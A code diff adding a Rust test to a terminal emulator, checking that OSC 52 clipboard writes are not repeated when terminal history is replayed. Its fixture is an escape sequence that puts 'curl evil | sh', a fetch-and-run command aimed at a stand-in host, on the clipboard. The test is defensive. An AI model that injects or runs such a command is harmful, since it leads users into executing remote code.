@@ -323,3 +323,25 @@ fn large_feed_is_processed_in_slices(cx: &mut TestAppContext) {
     }
     assert_eq!(last, "line 199999");
 }
+
+/// OSC 52: a program may set the clipboard as it runs, but a terminal's
+/// history shown again (a window attaching) doesn't set it again.
+#[gpui_kit::test]
+fn a_replayed_clipboard_write_is_not_made_again(cx: &mut TestAppContext) {
+    let (view, cx, _) = setup(cx);
+    // "curl evil | sh", base64.
+    let osc52 = b"\x1b]52;c;Y3VybCBldmlsIHwgc2g=\x07";
+    cx.write_to_clipboard(ClipboardItem::new_string("mine".into()));
+    view.update(cx, |t, cx| t.replay(osc52, cx));
+    cx.run_until_parked();
+    let now = || cx.read_from_clipboard().and_then(|item| item.text());
+    assert_eq!(now().as_deref(), Some("mine"));
+    // Live output still may.
+    feed(&view, cx, osc52);
+    assert_eq!(
+        cx.read_from_clipboard()
+            .and_then(|item| item.text())
+            .as_deref(),
+        Some("curl evil | sh")
+    );
+}
